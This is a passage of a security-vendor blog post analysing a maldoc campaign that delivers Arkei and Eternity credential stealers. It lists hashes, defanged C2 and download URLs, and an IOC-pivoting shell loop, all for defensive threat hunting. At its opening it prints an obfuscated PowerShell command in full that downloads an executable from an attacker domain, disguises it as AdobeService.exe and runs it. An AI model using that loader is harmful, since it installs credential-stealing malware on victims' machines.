+<pre class="wp-block-code"><code>&amp;("{4}{2}{1}{3}{0}"-f't',("{1}{0}{2}"-f'ebR',("{0}{1}"-f'oke','-W'),'eq'),'v','ues','In')("{2}{0}{1}{7}{6}{4}{3}{5}"-f("{1}{0}"-f'//r','tp:'),("{0}{2}{1}"-f'wwm',("{1}{0}"-f'au','fk'),'e'),'ht',("{0}{2}{1}"-f'16','x','t.e'),'9','e',("{2}{1}{0}"-f'd1',("{0}{1}"-f'il','de'),("{0}{1}"-f("{1}{0}"-f'u/b','a.r'),'u')),'ia')-OutFile"$env:appdata/Microsoft/AdobeService.exe";&amp;("{2}{1}{0}"-f'ss',("{0}{1}{2}"-f'ar',("{0}{1}"-f't',("{1}{0}"-f'Pro','-')),'ce'),'St')-Filepath"$env:appdata/Microsoft/AdobeService.exe"
+</code></pre>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>File Type&nbsp;</td><td>x32 Executable</td></tr><tr><td>SHA256</td><td><a href="https://www.virustotal.com/gui/file/27223530f9da259a9f2318b525399a30f5656ca4d2951d76af8039484d8f3e74">27223530f9da259a9f2318b525399a30f5656ca4d2951d76af8039484d8f3e74</a></td></tr><tr><td>Malware Family</td><td>Arkei Stealer</td></tr></tbody></table><figcaption>Sample 1</figcaption></figure>
+
+
+
+<p>The main task of “Arkei Stealer” is to collect as much account data as possible from the victim's computer. Logins, passwords, autofill forms, cryptocurrency wallets, and also geolocation. After collecting the data, they are sent to a remote server and the program deletes itself.</p>
+
+
+
+<p><strong>С2 Address</strong>:  hxxp://162.33.179[.]235/gatero0m.php</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>File Type&nbsp;</td><td>x32 .NET Assembly Executable&nbsp;</td></tr><tr><td>Sha 256&nbsp;</td><td><a href="https://www.virustotal.com/gui/file/beedb7cc465933bc983dab4c41f8464d985ec15680f60dec4f27e0a96e88939d">beedb7cc465933bc983dab4c41f8464d985ec15680f60dec4f27e0a96e88939d</a></td></tr><tr><td>Malware Family</td><td>Eternity Stealer</td></tr></tbody></table><figcaption>Sample 2</figcaption></figure>
+
+
+
+<p>Like the previous stealer, it collects all possible information about the victim, converts it into a ZIP archive and sends it to a server located in the Onion network. Eternity Stealer also creates a special file in which it writes basic information about the victim. As well as screenshots and browser data (Logins, passwords, autofill forms) in a separate SQL file.</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><img src="/sites/default/files/inline-images/7_1.png" alt="" class="wp-image-1683" data-entity-type="file" data-entity-uuid="a6eb2d47-06f6-454f-9347-9319f8673178" data-image-style="original"><figcaption>Image 8: Exfil report</figcaption></figure></div>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter size-full"><img src="/sites/default/files/inline-images/8_0.png" alt="" class="wp-image-1684" data-entity-type="file" data-entity-uuid="f1e33dde-48fa-4d00-ac69-4651f0ed3742" data-image-style="original"><figcaption>Image 9: PCAP sending data</figcaption></figure></div>
+
+
+
+<p>This is a rather unusual technique for launching two final payloads. However, this is very often used in recent times. Remote access programs and spyware are sold today as a service. This makes the threat landscape that organizations and users face today even more dangerous.</p>
+
+
+
+<h2>IOCs</h2>
+
+
+
+<h3><br>Stage 1 Maldocs</h3>
+
+
+
+<p class="text-monospace"><a href="https://labs.inquest.net/dfi/sha256/b3920fe11f1dcaf5a7f4cb8a37bed2dd6a8638c5f8a4312d4c07d11f7d0e62da">b3920fe11f1dcaf5a7f4cb8a37bed2dd6a8638c5f8a4312d4c07d11f7d0e62da</a><br><a href="https://labs.inquest.net/dfi/sha256/08cd999cee6f248e0847c012e68476ca38f280855e3b2406189ff9eca49087be">08cd999cee6f248e0847c012e68476ca38f280855e3b2406189ff9eca49087be</a><br><a href="https://labs.inquest.net/dfi/sha256/21354be825c9532dd39072e8a67ed935ce4cfc4f5077bd65f1118adf86c4a0d6">21354be825c9532dd39072e8a67ed935ce4cfc4f5077bd65f1118adf86c4a0d6</a><br><a href="http://0f1169276cf30b4514a043e9b3587c073e20efa186d26974490a54733288825d">0f1169276cf30b4514a043e9b3587c073e20efa186d26974490a54733288825d</a></p>
+
+
+
+<h3>Stage 2 Download (InQuest Labs IOC Lookup)</h3>
+
+
+
+<p><a href="https://labs.inquest.net/dfi/search/ioc/url/http%3A%2F%2Fckrddvcveumq.ru%2Fv7dgre.dotm##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==">hxxp://ckrddvcveumq[.]ru/v7dgre.dotm</a><br><a href="https://labs.inquest.net/dfi/search/ioc/url/https%3A%2F%2Fwww.dropbox.com%2Fs%2Fe6yaipmzb8ik7dm%2Fxcl2ba.dotm%3Fdl%3D1##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==">hxxps://www.dropbox[.]com/s/e6yaipmzb8ik7dm/xcl2ba.dotm?dl=1</a><br><a href="https://labs.inquest.net/dfi/search/ioc/url/http%3A%2F%2Fzyzkikpfewuf.ru%2Fhour84a6d9k.dotm##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==">hxxp://zyzkikpfewuf[.]ru/hour84a6d9k.dotm</a></p>
+
+
+
+<p><strong>Stage 2 exe downloader<br></strong><a href="https://www.virustotal.com/gui/file/7093aba8ae03275caab7372a7d56172df1716120d477dc276ee9f0b08816bd0c">7093aba8ae03275caab7372a7d56172df1716120d477dc276ee9f0b08816bd0c</a></p>
+
+
+
+<p id="text-monospace">hxxp://rwwmefkauiaa[.]ru/document1916t.pdf<br>hxxp://cugdwpnykghx[.]ru/bq979g5dfweq.exe<br>hxxp://cugdwpnykghx[.]ru/a0hngee18y3z.exe<br>hxxp://rwwmefkauiaa[.]ru/u84ls.exe<br>hxxp://rwwmefkauiaa[.]ru/builded1916t.exe</p>
+
+
+
+<p></p>
+
+
+
+<h3>Stage 3</h3>
+
+
+
+<p><a href="https://www.virustotal.com/gui/file/27223530f9da259a9f2318b525399a30f5656ca4d2951d76af8039484d8f3e74">27223530f9da259a9f2318b525399a30f5656ca4d2951d76af8039484d8f3e74 </a>- Arkei Stealer<br><a href="https://www.virustotal.com/gui/file/beedb7cc465933bc983dab4c41f8464d985ec15680f60dec4f27e0a96e88939d">beedb7cc465933bc983dab4c41f8464d985ec15680f60dec4f27e0a96e88939d </a>- Eternity Stealer<br></p>
+
+
+
+<h3>C2</h3>
+
+
+
+<p>hxxp://lightnogu5owjjllyo4tj2sfos6fchnmcidlgo6c7e6fz2hgryhfhoyd.onion/stealer/918119271?pwds=0&amp;cards=0&amp;wlts=0&amp;files=0&amp;user=dXNlcg==&amp;comp=aG9veWVxaXhsenk=&amp;ip=OTUuMjExLjE5MC4xOTk=&amp;country=TmV0aGVybGFuZHMgKE5MKQ==&amp;city=SGFhcmxlbQ==&amp;tag=32748</p>
+
+
+
+<p>hxxp://162.33.179[.]235/gatero0m.php</p>
+
+
+
+<p>Additional indicators potentially related to this campaign:</p>
+
+
+
+<p id="text-monospace">aztkiryhetxx[.]ru<br>ckrddvcveumq[.]ru<br>cugdwpnykghx[.]ru<br>dvizhdom[.]ru<br>dwrfqitgvmqn[.]ru<br>rhjebiuujydv[.]ru<br>rwwmefkauiaa[.]ru<br>sanlygeljek[.]ru<br>sinelnikovd[.]ru<br>wzqyuwtdxyee[.]ru<br>zpuxmwmwdxxk[.]ru<br>zyzkikpfewuf[.]ru<br>hxxp://zyzkikpfewuf[.]ru/hour84a6d9k.dotm<br>hxxp://zyzkikpfewuf[.]ru/hour84a6d9k.exe<br>hxxp://zyzkikpfewuf[.]ru/esttpnhsmb.exe<br>hxxp://zyzkikpfewuf[.]ru/eSttPnHsmB.exe<br>hxxp://zyzkikpfewuf[.]ru/XpqA02Df.exe<br>hxxp://zyzkikpfewuf[.]ru/xpqa02df.exe<br>hxxp://ckrddvcveumq[.]ru/<br>hxxps://ckrddvcveumq[.]ru/<br>hxxp://ckrddvcveumq[.]ru/v7dgre.dotm<br>hxxp://ckrddvcveumq[.]ru/p73tzehj.exe<br>hxxp://ckrddvcveumq[.]ru/p73tzehj.exe/<br>hxxp://cugdwpnykghx[.]ru/<br>hxxps://cugdwpnykghx[.]ru/<br>hxxp://cugdwpnykghx[.]ru/a0hngee18y3z.exe<br>hxxp://cugdwpnykghx[.]ru/0530cd.dat<br>hxxp://cugdwpnykghx[.]ru/ffe0a6.dat.dat<br>hxxp://cugdwpnykghx[.]ru/fd51a0.dat<br>hxxp://rwwmefkauiaa[.]ru/<br>hxxp://rwwmefkauiaa[.]ru/az9vu.exe<br>hxxps://rwwmefkauiaa[.]ru/<br>hxxp://rwwmefkauiaa[.]ru/builded1916t.exe<br>hxxp://rwwmefkauiaa[.]ru/u84ls.exe<br>hxxp://rwwmefkauiaa[.]ru/fyi82dk.pdf<br>hxxp://rwwmefkauiaa[.]ru/vdl4t.exe</p>
+
+
+
+<p><strong>Pivoting on the overlooked anchor (XMP ID)</strong></p>
+
+
+
+<p><a href="https://labs.inquest.net/dfi/search/ioc/xmpid/xmp.iid%3Ad68e8829-30b4-40ef-ba8e-2b22843a29c6##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==">https://labs.inquest.net/dfi/search/ioc/xmpid/xmp.iid%3Ad68e8829-30b4-40ef-ba8e-2b22843a29c6##eyJyZXN1bHRzIjpbIn4iLCJmaXJzdFNlZW4iLDEsIiIsW11dfQ==</a><br><br>Kung-fu IOC extraction supported by the InQuest Labs <a href="https://github.com/inquest/python-inquestlabs">CLI Library</a>.<br><br></p>
+
+
+
+<pre class="wp-block-preformatted iq-terminal"><div class="fakeMenu"><div class="fakeButtons fakeClose"></div><div class="fakeButtons fakeMinimize"></div><div class="fakeButtons fakeZoom"></div></div><div class="fakeScreen">$ for h in `inquest_labs dfi search xmpid xmp.did:eabe445b-730a-4965-9015-880d3f27fe09 | jq -r ".[].sha256"`;
+do
+    inquest_labs dfi attributes $h --filter=url | jq -r ".[].value";
+done | sort -u | grep -v gimp.org | sed -E 's/http/hxxp/g'
+
+hxxp://ckrddvcveumq.ru/v7dgre.dotm
+hxxps://github.com/Collabsss/dotm/raw/main/tj3wqx.dotm
+hxxps://www.dropbox.com/s/e6yaipmzb8ik7dm/xcl2ba.dotm?dl=1
+hxxp://zyzkikpfewuf.ru/hour84a6d9k.dotm
+</div></pre>
+
+
+
+<p></p>
+</div>
+      
+      <hr class="my-5">
+      <h5 class="mb-4">Tags</h5>
+      
+    </div>
+  </article>
+<div class="my-5 border border-grey p-4">
+  <h2 class="font-weight-bold mb-4">Get The InQuest Insider</h2>
+  <p>Find us on <a href="https://twitter.com/inquest">Twitter</a> for frequent updates, follow our <a href="/blog">Blog</a> for bi-weekly technical write-ups, or subscribe here to receive our monthly newsletter, The InQuest Insider. We curate and provide you with the latest news stories, field notes about innovative malware, novel research / analysis / threat hunting tools, security tips and more.</p>
+  <!-- Begin Mailchimp Signup Form -->
+  <div id="mc_embed_signup">
+    <form action="https://inquest.us19.list-manage.com/subscribe/post?u=efc2b20ca746ae05450458690&amp;id=518641327c" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate="novalidate" data-hs-cf-bound="true">
+      <div id="mc_embed_signup_scroll" class="d-sm-flex mb-2 mb-sm-0">
+        <div class="flex-fill mb-3 mb-sm-0">
+          <input type="email" value="" name="EMAIL" class="form-control px-0" id="mce-EMAIL" placeholder="Email address" style="background:transparent">
+          <div id="mce-responses" class="clear">
+            <div class="response" id="mce-error-response" style="display:none"></div>
+            <div class="response" id="mce-success-response" style="display:none"></div>
+          </div>
+          <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_efc2b20ca746ae05450458690_518641327c" tabindex="-1" value=""></div>
+        </div>
+        <div class="ml-sm-3">
+          <input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe" class="btn btn-primary text-uppercase">
+        </div>
+      </div>
+    </form>
+  </div>
+  <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/mc-validate.js"></script><script type="text/javascript">(function($) {window.fnames = new Array(); window.ftypes = new Array();fnames[0]='EMAIL';ftypes[0]='email';}(jQuery));var $mcj = jQuery.noConflict(true);</script>
+  <!--End mc_embed_signup-->
+</div>
+<div class="row">
+  <div class="col-md-6">
+    <a href="/blog" class="text-dark d-block border border-grey p-4 text-center">
+      <h3 class="p-3 font-weight-bold">Other Blog Articles</h3>
+      <img class="p-3" src="/themes/custom/inquest_salted_stone/assets/img/forward.svg" alt="Forward Arrow Icon">
+    </a>
+  </div>
+  <div class="col-md-6">
+    <a href="/contact-us" class="text-dark d-block border border-grey p-4 text-center">
+      <h3 class="p-3 font-weight-bold">Schedule a Demo</h3>
+      <img class="p-3" src="/themes/custom/inquest_salted_stone/assets/img/forward.svg" alt="Forward Arrow Icon">
+    </a>
+  </div>
+</div>
+  <div class="block block--basic block--inquest-salted-stone-googleanalytics">
+
+  
+    
+
+      
+            <div class="basic__body"><!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-108284164-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-108284164-1');
+</script></div>
+      
+  
+  </div>
+
+  <div class="block block--basic block--inquest-salted-stone-hubspot">
+
+  
+    
+
+      
+            <div class="basic__body"><!-- Start of HubSpot Embed Code -->
+<script type="text/javascript" id="hs-script-loader" async="" defer="" src="//js.hs-scripts.com/4270940.js"></script>
+<!-- End of HubSpot Embed Code --></div>
+      
+  
+  </div>
+
+
+        </div>
+          
+      
+    </main>
+
+    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  <div class="pswp__bg"></div>
+  <div class="pswp__scroll-wrap">
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    <div class="pswp__ui pswp__ui--hidden">
+      <div class="pswp__top-bar">
+        <div class="pswp__counter"></div>
+        <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <button class="pswp__button pswp__button--share" title="Share"></button>
+        <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+          <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+        </div>
+      </div>
+      <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+        <div class="pswp__share-tooltip"></div>
+      </div>
+      <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+      </button>
+      <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+      </button>
+      <div class="pswp__caption">
+        <div class="pswp__caption__center"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    <footer class="page__footer p-3 bg-grey mt-5">
+  <div class="container"> 
+    <div class="d-md-flex justify-content-md-between mt-4">
+      <a href="/contact-us" class="btn btn-danger d-sm-none mb-5">Schedule a Demo</a>
+      <div class="mb-4">
+        <h5 class="text-uppercase mb-4">Site Map</h5>
+        <ul class="list-unstyled m-0">
+          <li class="mb-4"><a href="/">Overview</a></li>
+          <li class="mb-4"><a href="/solutions">Solutions</a></li>
+          <li class="mb-4"><a href="/products">Products</a></li>
+          <li class="mb-4"><a href="/services">Services</a></li>
+          <li class="mb-4"><a href="/partners">Partners</a></li>
+          <li class="mb-4"><a href="/use-cases">Use Cases</a></li>
+          <li><a href="/blog">Blog</a></li>
+        </ul>
+      </div>
+      <div class="mb-4">
+        <h5 class="text-uppercase mb-4">Miscellaneous</h5>
+        <ul class="list-unstyled m-0">
+          <li class="mb-4"><a href="https://labs.inquest.net">InQuest Labs</a></li>
+          <li class="mb-4"><a href="/malware-lures-gallery">Curated Gallery of Malware Lures</a></li>
+          <li class="mb-4"><a href="/roi-calculators">ROI Calculators</a></li>
+          <li class="mb-4"><a href="/contact-us-free-assessment">#FreeAssessment</a></li>
+          <li class="mb-4"><a href="/contact-us-free-intel">#FreeIntel</a></li>
+          <li class="mb-4"><a href="/trystero">Trystero</a></li>
+          <li class="mb-4"><a href="https://go.inquest.net/inquest-two-pager.pdf">Data Sheet</a></li>
+          <li class="mb-4"><a href="https://inquest.net/privacy-policy">Privacy Policy</a></li>
+        </ul>
+        <div class="d-none d-sm-block">
+          <a href="/contact-us" class="btn btn-danger my-5 d-block">Schedule a Demo</a>
+          <h5 class="text-uppercase mb-4">Inquest, LLC</h5>
+          2403 East 16th Street Studio Q<br>
+          Austin, Texas 78702<br>
+          USA
+        </div>
+      </div>
+      <div class="mx-md-2 mb-4 d-none d-sm-block">
+        <h5 class="text-uppercase mb-4">Latest Tweets</h5>
+        <script src="//platform.twitter.com/widgets.js"></script>
+        <iframe id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="twitter-timeline twitter-timeline-rendered" style="position: static; visibility: visible; display: inline-block; width: 100%; height: 310px; padding: 0px; border: none; max-width: 100%; min-width: 180px; margin-top: 0px; margin-bottom: 0px; min-height: 200px;" data-widget-id="profile:InQuest" title="Twitter Timeline"></iframe><a class="twitter-timeline" data-height="310" data-chrome="noheader nofooter noborders noscrollbar transparent" data-theme="dark" href="https://twitter.com/InQuest?ref_src=twsrc%5Etfw" data-twitter-extracted-i1653586898781578895="true">Tweets by InQuest</a>
+      </div>
+      <div class="mb-4 d-none d-sm-block">
+        <h5 class="text-uppercase mb-4">Contact</h5>
+        <ul class="list-unstyled m-0">
+          <li class="mb-2">
+            <div class="text-uppercase text-muted"><img src="/themes/custom/inquest_salted_stone/assets/img/inquest-phone-icon.svg" alt="Phone Icon"> Phone</div>
+            <div>+1 (866) 982-0561</div>
+          </li>
+          <li class="mb-2">
+            <div class="text-uppercase text-muted"><img src="/themes/custom/inquest_salted_stone/assets/img/inquest-web-icon.svg" alt="Website / URL Icon"> Support web</div>
+            <div>support.inquest.net</div>
+          </li>
+          <li class="mb-2">
+            <div class="text-uppercase text-muted"><img src="/themes/custom/inquest_salted_stone/assets/img/inquest-envelope-icon.svg" alt="Envelope / Mail / Contact Icon"> Support</div>
+            <div>support@inquest.net</div>
+          </li>
+          <li class="mb-2">
+            <div class="text-uppercase text-muted"><img src="/themes/custom/inquest_salted_stone/assets/img/inquest-envelope-icon.svg" alt="Envelope / Mail / Contact Icon"> Sales</div>
+            <div>sales@inquest.net</div>
+          </li>
+          <li>
+            <div class="text-uppercase text-muted"><img src="/themes/custom/inquest_salted_stone/assets/img/inquest-pgp-icon.svg" alt="PGP Key Icon"> PGP Key</div>
+            <div><a href="/164238EF.asc">inquest.pgp</a></div>
+          </li>
+        </ul>
+      </div>
+    </div>
+    <div class="row">
+      <div class="col-sm-6 my-4">
+        <h6 class="text-muted">Copyright © <script>document.write(new Date().getFullYear())</script>2022</h6>
+      </div>
+      <div class="col-sm-6 my-4 text-sm-right">
+        <a href="https://twitter.com/inquest" class="btn-social mr-4">
+          <svg width="24" height="24">
+            <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-twitter.svg#twitter"></use>
+          </svg>
+        </a>
+        <a href="https://linkedin.com/company/inquest.net" class="btn-social mr-4">
+          <svg width="24" height="24">
+            <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-linkedin.svg#linkedin"></use>
+          </svg>
+        </a>
+        <a href="https://github.com/inquest" class="btn-social mr-4">
+          <svg width="24" height="24">
+            <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-github.svg#github"></use>
+          </svg>
+        </a>
+        <a href="https://pypi.org/user/inquestlabs/" class="btn-social mr-4">
+          <svg width="24" height="24">
+            <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-python.svg#python"></use>
+          </svg>
+        </a>
+        <a href="https://www.youtube.com/channel/UCKra9C__cMHfyqi8dB5roEA" class="btn-social">
+          <svg width="24" height="24">
+            <use href="/themes/custom/inquest_salted_stone/assets/img/inquest-icon-youtube.svg#youtube"></use>
+          </svg>
+        </a>
+      </div>
+    </div>
+  </div>
+</footer>
+  </div>
+</div>
+<script src="//rum-static.pingdom.net/pa-5e7695f5229e9300080006eb.js" async=""></script>
+<script>
+	var _urconfig = { sid: "3dd213be-1d7e-4b6a-97d6-a0e4f95fc0ec", aip: 0, usePageProtocol: false };
+	(function (d, s) {
+	    var js = d.createElement(s),
+	        sc = d.getElementsByTagName(s)[0];
+	    js.src = "https://hit.uptrendsdata.com/rum.min.js";
+	    js.async = "async";
+	    sc.parentNode.insertBefore(js, sc);
+	}(document, "script"));
+</script>
+
+<div class="bg-dark p-2 position-fixed fixed-bottom dismiss-cookie">
+  <div class="d-flex">
+    <div class="flex-grow-1">
+      This website stores cookies on your computer. These cookies are used to improve the usability of this website and provide more personalized experience for you, both on this website and through other websites. To find out more, see our <a href="/privacy-policy">Privacy Policy</a>.
+    </div>
+    <div class="d-flex align-items-center">
+      <a href="#" class="btn btn-primary btn-sm px-2 p-0">Accept</a>
+    </div>
+</div>
+  </div>
+
+    
+    <script type="application/json" data-drupal-selector="drupal-settings-json">{"path":{"baseUrl":"\/","scriptPath":null,"pathPrefix":"","currentPath":"node\/333","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"google_analytics":{"account":"UA-132691306-1","trackOutbound":true,"trackMailto":true,"trackDownload":true,"trackDownloadExtensions":"7z|aac|arc|arj|asf|asx|avi|bin|csv|doc(x|m)?|dot(x|m)?|exe|flv|gif|gz|gzip|hqx|jar|jpe?g|js|mp(2|3|4|e?g)|mov(ie)?|msi|msp|pdf|phps|png|ppt(x|m)?|pot(x|m)?|pps(x|m)?|ppam|sld(x|m)?|thmx|qtm?|ra(m|r)?|sea|sit|tar|tgz|torrent|txt|wav|wma|wmv|wpd|xls(x|m|b)?|xlt(x|m)|xlam|xml|z|zip"},"ajaxTrustedUrl":{"\/search":true},"user":{"uid":0,"permissionsHash":"e0be8590f8b3aaa0a1c0ebfd82144b11cf5651171483599e607a6c42c31e0fdd"}}</script>
+<script src="/sites/default/files/js/js_Q4H5x8K7ECMlUOrGxTcVxWIgOUA_JD5j3crbGefjMks.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/animejs/2.0.2/anime.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.2/highlight.min.js"></script>
+<script src="/sites/default/files/js/js_IJQra_qs4vnGv5AliKSONDkiDu4OYMdvFpF-fvSsXFY.js"></script>
+
+  
+
+</div><iframe scrolling="no" frameborder="0" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.bbd13993eb53d3a11ac08f5e8cf9d6a4.html?origin=https%3A%2F%2Finquest.net" title="Twitter settings iframe" style="display: none;"></iframe><iframe owner="archetype" title="archetype" style="display: none; visibility: hidden;"></iframe></body></html>
